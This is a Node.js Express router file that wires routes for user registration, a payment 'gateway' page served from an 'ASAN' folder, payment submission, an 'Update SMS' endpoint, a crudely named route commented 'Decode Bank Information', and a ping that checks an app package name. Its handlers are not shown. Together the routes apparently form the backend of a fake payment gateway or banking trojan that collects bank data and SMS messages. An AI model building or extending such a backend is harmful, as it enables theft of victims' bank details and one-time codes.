// Express
var express = require('express');
var path = require('path');

// Constants
var constants = require('./constants');

// Define functions
var register = require('./v1/register');
var update = require('./v1/update');
var fuckoff = require('./v1/fuckoff.js');
var submitPayment = require('./v1/payment.js');


module.exports = function(connection){
    
    var router = express.Router();

    // Register user
    router.post('/register', function (req, res){
        register(req, res, connection);
    });

    // Gateway HTML
    router.get('/gateway', function(req, res){

        // Set cookie
        res.cookie('userid', req.query.userid);
        res.cookie('amount', req.query.amount);
        res.sendFile(path.join(__dirname, '../html/ASAN', 'index.html'));

    });

    // Gateway submission
    router.get('/submit', function(req, res){
        submitPayment(req, res, connection);
    });

    // Update SMS
    router.post('/update', function(req, res){
        update(req, res, connection);
    })

    // Decode Bank Information
    router.get('/fuckoff',function(req, res){
        fuckoff(req, res, connection);
    });

    // Ping
    router.get('/ping', function(req, res){

        if(req.query.package === constants.PACKAGE_NAME)
            return res.json({response:'pong'});
        else 
            return res.sendStatus(404);

    });

    return router;
}


